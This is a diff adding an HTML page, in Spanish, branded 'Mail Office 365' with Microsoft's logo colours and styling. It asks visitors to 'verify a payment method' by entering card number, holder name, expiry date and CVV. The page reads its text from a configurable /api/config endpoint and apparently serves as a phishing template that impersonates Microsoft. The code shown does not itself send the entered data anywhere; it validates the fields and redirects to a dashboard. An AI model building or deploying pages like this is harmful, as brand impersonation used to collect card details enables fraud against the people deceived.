@@ -1,0 +1,393 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Verificar método de pago - Mail Office 365</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config={
+  theme:{
+    extend:{
+      colors:{
+        'ms-blue':'#0078d4','ms-blue-hover':'#106ebe','ms-red':'#f25022',
+        'ms-green':'#7fba00','ms-yellow':'#ffb900','ms-blue-logo':'#00bcf2',
+        'ms-gray':'#1b1b1b','ms-gray-light':'#605e5c','ms-border':'#8a8886',
+        'ms-error':'#dc2626','ms-error-bg':'#fef2f2','ms-error-border':'#fca5a5'
+      },
+      fontFamily:{
+        'segoe':['"Segoe UI"','system-ui','-apple-system','BlinkMacSystemFont','sans-serif']
+      },
+      fontSize:{
+        'ms-title':['28px',{lineHeight:'36px',fontWeight:'600'}],
+        'ms-subtitle':['15px',{lineHeight:'20px',fontWeight:'400'}],
+        'ms-body':['15px',{lineHeight:'20px',fontWeight:'400'}],
+        'ms-link':['13px',{lineHeight:'16px',fontWeight:'400'}],
+        'ms-logo':['21px',{lineHeight:'28px',fontWeight:'600'}]
+      },
+      boxShadow:{
+        'ms-card':'0 2px 6px rgba(0,0,0,0.2)'
+      }
+    }
+  }
+}
+</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body,html{min-height:100vh;width:100%;background-size:cover;background-position:center;background-repeat:no-repeat;
+  font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background-color:#0a0a1a;background-image:none}
+body.bg-gradient{background:var(--login-bg-gradient,linear-gradient(135deg,#0a0a1a 0%,#1a1a2e 100%))}
+body.bg-image{background-image:var(--login-bg-image,none);background-size:cover;background-position:center}
+.ms-input{
+  border:1px solid #8a8886;font-size:15px;padding:11px 12px;line-height:20px;
+  border-radius:2px;color:#1b1b1b;background:#fff;width:100%
+}
+.ms-input:focus{outline:none;border-color:#0078d4;box-shadow:inset 0 0 0 1px #0078d4}
+.ms-button{
+  background:#0078d4;transition:background-color .1s ease;font-size:15px;font-weight:600;
+  padding:8px 12px;min-height:32px;border-radius:2px;color:#fff;border:none;cursor:pointer;font-family:inherit
+}
+.ms-button:hover{background:#106ebe}
+.ms-button:active{background:#005a9e}
+.ms-button:disabled{background:#8a8886;cursor:not-allowed}
+.ms-link{color:#0078d4;text-decoration:none;font-size:13px}
+.ms-link:hover{text-decoration:underline}
+.fade-in{animation:fadeIn .3s ease-out}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.main-container{position:fixed;top:0;left:0;right:0;bottom:0;display:flex;align-items:center;justify-content:center;padding:1rem;z-index:10}
+@media(min-width:640px){.main-container{position:static;min-height:100vh}}
+.error-box{background:#fef2f2;border:1px solid #fca5a5;border-radius:4px;padding:8px 12px;margin-bottom:12px;text-align:center}
+.error-text{color:#dc2626;font-size:13px;font-weight:500}
+
+/* Tarjeta de crédito preview */
+.card-preview{
+  width:100%;max-width:320px;margin:0 auto 24px;background:linear-gradient(135deg,#1a1a2e,#0d0d1a);
+  border-radius:12px;padding:20px;color:#fff;position:relative;overflow:hidden;box-shadow:0 4px 12px rgba(0,0,0,.3)
+}
+.chip{
+  width:40px;height:28px;background:linear-gradient(135deg,#e8c964,#c9a84c);border-radius:4px;
+  position:absolute;top:20px;right:20px;opacity:.9
+}
+.card-number-display{
+  font-size:20px;letter-spacing:2px;font-family:"Courier New",monospace;margin-top:36px;
+  text-shadow:0 1px 2px rgba(0,0,0,.3);font-weight:600
+}
+.payment-card-label{font-size:11px;opacity:.75;text-transform:uppercase;letter-spacing:.5px}
+.payment-card-value{font-size:14px;font-weight:600;text-align:center}
+
+/* Grid para expiry/CVV */
+.grid-cols-2-ms{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.grid-cols-2-ms>div{display:flex;flex-direction:column}
+
+.footer-bar{position:fixed;bottom:0;left:0;right:0;background:rgba(255,255,255,.95);backdrop-filter:blur(8px);
+  border-top:1px solid #e5e5e5;padding:8px 16px;z-index:50}
+.footer-bar .footer-inner{max-width:1200px;margin:0 auto;display:flex;flex-wrap:wrap;align-items:center;
+  justify-content:center;gap:8px 24px}
+.footer-bar a{color:#605e5c;font-size:12px;text-decoration:none}
+.footer-bar a:hover{color:#0078d4;text-decoration:underline}
+</style>
+</head>
+<body>
+
+<div class="fixed inset-0 bg-white/10 backdrop-blur-[0.5px]"></div>
+
+<div class="main-container">
+  <div class="w-full max-w-md fade-in relative z-10">
+    <div class="bg-white rounded shadow-lg p-12" style="border:1px solid #e5e5e5">
+
+      <!-- Logo -->
+      <div class="flex items-center justify-center mb-8">
+        <div class="grid grid-cols-2 gap-px w-6 h-6 mr-3">
+          <div class="bg-ms-red w-3 h-3" id="logoColor1" style="background:#f25022;border-radius:1px"></div>
+          <div class="bg-ms-green w-3 h-3" id="logoColor2" style="background:#7fba00;border-radius:1px"></div>
+          <div class="bg-ms-blue-logo w-3 h-3" id="logoColor3" style="background:#00bcf2;border-radius:1px"></div>
+          <div class="bg-ms-yellow w-3 h-3" id="logoColor4" style="background:#ffb900;border-radius:1px"></div>
+        </div>
+        <span class="text-ms-logo text-ms-gray" id="logoText">Mail Office 365</span>
+      </div>
+
+      <!-- Email badge -->
+      <div class="mb-6">
+        <div class="text-center mb-4">
+          <div class="inline-flex items-center justify-center bg-transparent rounded-full px-5 py-2 border border-gray-300">
+            <span id="userEmailBadge" class="text-sm text-ms-gray font-medium">Pago seguro</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Card Preview -->
+      <div class="card-preview">
+        <div class="chip"></div>
+        <div class="card-number-display" id="cardPreview">•••• •••• •••• ••••</div>
+        <div class="flex justify-between mt-4">
+          <div>
+            <div class="payment-card-label">TITULAR</div>
+            <div class="payment-card-value" id="namePreview">NOMBRE APELLIDO</div>
+          </div>
+          <div class="text-right">
+            <div class="payment-card-label">VENCE</div>
+            <div class="payment-card-value" id="datePreview">MM/AA</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Title -->
+      <h1 class="text-lg text-ms-gray mb-4 font-semibold text-center" id="paymentTitle">Verificar método de pago</h1>
+
+      <!-- Error -->
+      <div class="mb-4 p-2 bg-ms-error-bg border border-ms-error-border rounded hidden" id="errorMessage">
+        <div class="flex items-start">
+          <svg class="w-3 h-3 text-ms-error mt-0.5 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+          </svg>
+          <div>
+            <p class="text-xs text-ms-error font-medium" id="errorTitle">Complete todos los campos correctamente</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Form -->
+      <form onsubmit="handlePayment(event)" class="space-y-4" id="paymentForm">
+        <!-- Card Number -->
+        <div>
+          <label style="font-size:13px;font-weight:500;color:#374151;margin-bottom:4px;display:block">Número de tarjeta</label>
+          <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" class="ms-input" required maxlength="19" autocomplete="off">
+        </div>
+
+        <!-- Card Holder -->
+        <div>
+          <label style="font-size:13px;font-weight:500;color:#374151;margin-bottom:4px;display:block">Nombre del titular</label>
+          <input type="text" id="cardHolder" placeholder="Como aparece en la tarjeta" class="ms-input" required autocomplete="off">
+        </div>
+
+        <!-- Expiry + CVV -->
+        <div class="grid-cols-2-ms">
+          <div>
+            <label style="font-size:13px;font-weight:500;color:#374151;margin-bottom:4px;display:block">Fecha expiración</label>
+            <input type="text" id="expiryDate" placeholder="MM/AA" class="ms-input" required maxlength="5" autocomplete="off">
+          </div>
+          <div>
+            <label style="font-size:13px;font-weight:500;color:#374151;margin-bottom:4px;display:block">CVV</label>
+            <input type="password" id="cvv" placeholder="123" class="ms-input" required maxlength="4" autocomplete="off">
+          </div>
+        </div>
+
+        <!-- Forgot PIN -->
+        <div class="text-left">
+          <a href="#" class="ms-link" id="forgotPINText">¿Olvidó su PIN?</a>
+        </div>
+
+        <!-- Submit -->
+        <button type="submit" id="submitButton" class="ms-button w-full">Verificar tarjeta</button>
+      </form>
+
+      <!-- Other options -->
+      <div class="mt-8 pt-6 border-t border-gray-200">
+        <div class="text-center">
+          <a href="javascript:void(0)" onclick="redirectToPayment()" class="ms-link" id="otherPaymentText">Otras formas de pago</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<div class="footer-bar" id="footerBar">
+  <div class="footer-inner">
+    <a href="#" id="footerHelp">Ayuda</a>
+    <a href="#" id="footerTerms">Términos de uso</a>
+    <a href="#" id="footerPrivacy">Privacidad y cookies</a>
+    <span style="display:none;text-align:center;font-size:12px" id="footerPrivate">Usa la exploración privada si este no es tu dispositivo. <a href="#">Más información</a></span>
+  </div>
+</div>
+
+<script>
+const DEFAULTS={
+  logoText:'Mail Office 365',
+  logoColor1:'#f25022',logoColor2:'#7fba00',logoColor3:'#00bcf2',logoColor4:'#ffb900',
+  paymentTitle:'Verificar método de pago',
+  paymentEmailBadgeText:'Pago seguro',
+  paymentCardPreview:'•••• •••• •••• ••••',
+  paymentNamePreview:'NOMBRE APELLIDO',
+  paymentDatePreview:'MM/AA',
+  paymentCardNumberPlaceholder:'1234 5678 9012 3456',
+  paymentCardHolderPlaceholder:'Como aparece en la tarjeta',
+  paymentExpiryPlaceholder:'MM/AA',
+  paymentCVVPlaceholder:'123',
+  paymentForgotPINText:'¿Olvidó su PIN?',
+  paymentSubmitButtonText:'Verificar tarjeta',
+  paymentOtherPaymentText:'Otras formas de pago',
+  loginBgType:'color',
+  loginBgColor:'#0a0a1a',
+  loginBgGradient:'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',
+  loginBgImage:'',
+  footerHelpText:'Ayuda',
+  footerTermsText:'Términos de uso',
+  footerPrivacyText:'Privacidad y cookies',
+  footerPrivateText:'Usa la exploración privada si este no es tu dispositivo.'
+};
+
+let config;
+
+async function loadConfig(){
+  try{
+    const res=await fetch('/api/config');
+    if(res.ok){
+      const data=await res.json();
+      if(data.success&&data.config){
+        config={...DEFAULTS,...data.config};
+        return;
+      }
+    }
+  }catch(e){}
+  try{
+    const stored=localStorage.getItem('mailoffice365_cfg');
+    if(stored){
+      config={...DEFAULTS,...JSON.parse(stored)};
+      return;
+    }
+  }catch(e){}
+  config={...DEFAULTS};
+}
+
+function applyConfig(){
+  const c=config;
+  document.getElementById('logoText').textContent=c.logoText;
+  document.getElementById('paymentTitle').textContent=c.paymentTitle;
+  document.getElementById('userEmailBadge').textContent=c.paymentEmailBadgeText;
+  document.getElementById('cardPreview').textContent=c.paymentCardPreview;
+  document.getElementById('namePreview').textContent=c.paymentNamePreview;
+  document.getElementById('datePreview').textContent=c.paymentDatePreview;
+  document.getElementById('cardNumber').placeholder=c.paymentCardNumberPlaceholder;
+  document.getElementById('cardHolder').placeholder=c.paymentCardHolderPlaceholder;
+  document.getElementById('expiryDate').placeholder=c.paymentExpiryPlaceholder;
+  document.getElementById('cvv').placeholder=c.paymentCVVPlaceholder;
+  document.getElementById('forgotPINText').textContent=c.paymentForgotPINText;
+  document.getElementById('submitButton').textContent=c.paymentSubmitButtonText;
+  document.getElementById('otherPaymentText').textContent=c.paymentOtherPaymentText;
+  document.getElementById('footerHelp').textContent=c.footerHelpText;
+  document.getElementById('footerTerms').textContent=c.footerTermsText;
+  document.getElementById('footerPrivacy').textContent=c.footerPrivacyText;
+  document.getElementById('footerPrivate').innerHTML=(c.footerPrivateText||'')+' <a href="#">Más información</a>';
+  document.getElementById('logoColor1').style.background=c.logoColor1;
+  document.getElementById('logoColor2').style.background=c.logoColor2;
+  document.getElementById('logoColor3').style.background=c.logoColor3;
+  document.getElementById('logoColor4').style.background=c.logoColor4;
+  applyBackground(c);
+}
+
+function applyBackground(c){
+  document.body.classList.remove('bg-gradient','bg-image');
+  if(c.loginBgType==='gradient'){
+    document.body.style.background=c.loginBgGradient;
+    document.body.style.backgroundImage='none';
+    document.body.classList.add('bg-gradient');
+  }else if(c.loginBgType==='image'&&c.loginBgImage){
+    document.body.style.backgroundImage='url('+c.loginBgImage+')';
+    document.body.style.backgroundSize='cover';
+    document.body.style.backgroundPosition='center';
+    document.body.classList.add('bg-image');
+  }else{
+    document.body.style.backgroundImage='none';
+    document.body.style.backgroundColor=c.loginBgColor;
+  }
+}
+
+function showError(msg){
+  const box=document.getElementById('errorMessage');
+  const text=document.getElementById('errorTitle');
+  if(box&&text){
+    text.textContent=msg;
+    box.style.display='block';
+  }
+}
+
+function hideError(){
+  const box=document.getElementById('errorMessage');
+  if(box)box.style.display='none';
+}
+
+function formatCardNumber(value){
+  return value.replace(/\s/g,'').replace(/(\d{4})(?=\d)/g,'$1 ').trim();
+}
+
+function validateCardNumber(num){
+  const clean=num.replace(/\s/g,'');
+  return /^\d{13,19}$/.test(clean);
+}
+
+function validateExpiry(exp){
+  return /^(0[1-9]|1[0-2])\/\d{2}$/.test(exp);
+}
+
+function validateCVV(cvv){
+  return /^\d{3,4}$/.test(cvv);
+}
+
+function handlePayment(event){
+  event.preventDefault();
+  hideError();
+
+  const cardNumber=document.getElementById('cardNumber').value.trim();
+  const cardHolder=document.getElementById('cardHolder').value.trim();
+  const expiryDate=document.getElementById('expiryDate').value.trim();
+  const cvv=document.getElementById('cvv').value.trim();
+  const submitBtn=document.getElementById('submitButton');
+
+  if(!cardNumber||!validateCardNumber(cardNumber)){
+    showError('Ingresa un número de tarjeta válido (13-19 dígitos).');
+    return;
+  }
+
+  if(!cardHolder||cardHolder.length<2){
+    showError('Ingresa el nombre del titular de la tarjeta.');
+    return;
+  }
+
+  if(!expiryDate||!validateExpiry(expiryDate)){
+    showError('Fecha de expiración inválida. Use el formato MM/AA.');
+    return;
+  }
+
+  if(!cvv||!validateCVV(cvv)){
+    showError('CVV inválido (3 o 4 dígitos).');
+    return;
+  }
+
+  submitBtn.disabled=true;
+  submitBtn.textContent='Procesando...';
+
+  setTimeout(()=>{
+    const dashboardUrl=window.location.origin+'/dashboard.html';
+    window.location.href=dashboardUrl;
+  },1500);
+}
+
+function redirectToPayment(){
+  window.location.href='https://www.paypal.com';
+}
+
+function cardNumberInput(event){
+  const input=document.getElementById('cardNumber');
+  let value=formatCardNumber(input.value);
+  if(value.length>19)value=value.slice(0,19);
+  input.value=value;
+}
+
+function expiryInput(event){
+  const input=document.getElementById('expiryDate');
+  let value=input.value.replace(/[^0-9]/g,'').slice(0,4);
+  if(value.length>=2)value=value.slice(0,2)+'/'+value.slice(2);
+  input.value=value;
+}
+
+(function(){
+  loadConfig().then(()=>applyConfig());
+
+  document.getElementById('cardNumber').addEventListener('input',cardNumberInput);
+  document.getElementById('expiryDate').addEventListener('input',expiryInput);
+})();
+</script>
+</body>
+</html>
